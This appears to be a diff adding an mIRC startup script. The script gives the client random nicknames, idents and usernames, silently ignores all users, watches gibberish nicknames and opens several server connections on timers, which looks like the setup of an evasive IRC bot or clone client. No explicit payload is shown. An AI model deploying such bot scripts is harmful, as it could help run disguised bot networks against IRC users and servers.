@@ -1,0 +1,14 @@
+[script]
+n0=on 1:start:{
+n1=  nick $read nicks.txt
+n2=  anick $read nicks.txt
+n3=  fullname $read fullname.txt
+n4=  identd on $read ident.txt
+n5=  set %console
+n6=  notify on | notify gfdggdfgfd | notify gffdgffdfg | notify setup | notify dns
+n7=  writeini mirc.ini mirc user $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(111111,999999) | saveini
+n8=  ignore -td *!*@*
+n9=  server $read servers.txt
+n10=  set %utime $ctime 
+n11=  .timer 1 120 server -m | fullname $read fullname.txt | identd on $read ident.txt | nick $read nicks.txt | anick $read nicks.txt
+n12=  .timer 1 240 server -m +
